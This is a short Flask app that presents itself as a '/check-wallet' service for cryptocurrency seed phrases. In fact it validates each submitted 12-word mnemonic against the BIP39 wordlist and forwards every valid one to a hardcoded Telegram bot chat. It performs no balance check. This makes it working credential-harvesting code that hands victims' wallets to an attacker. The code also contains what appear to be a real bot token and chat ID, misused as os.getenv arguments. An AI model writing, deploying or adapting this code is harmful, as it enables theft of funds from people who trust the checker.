from flask import Flask, request
import requests
from mnemonic import Mnemonic
import os

app = Flask(__name__)
mnemo = Mnemonic("english")

TELEGRAM_TOKEN = os.getenv("7536357798:AAEHFNmd8vMjAphrz-D26RKqFGtlHFJQFwg")
TELEGRAM_CHAT_ID = os.getenv("6511997676")

def is_valid_mnemonic(phrase):
    words = phrase.strip().split()
    return len(words) == 12 and all(word in mnemo.wordlist for word in words)

@app.route("/check-wallet", methods=["GET"])
def check_wallet():
    mnemonic_phrase = request.args.get("mnemonic")
    if not mnemonic_phrase:
        return "No mnemonic provided", 400

    if not is_valid_mnemonic(mnemonic_phrase):
        return "invalid", 400

    # (Optional) Add wallet balance verification here if you want

    message = f"✅ VALID MNEMONIC:\n\n{mnemonic_phrase}"
    requests.get(
        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
        params={"chat_id": TELEGRAM_CHAT_ID, "text": message}
    )
    return "valid"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
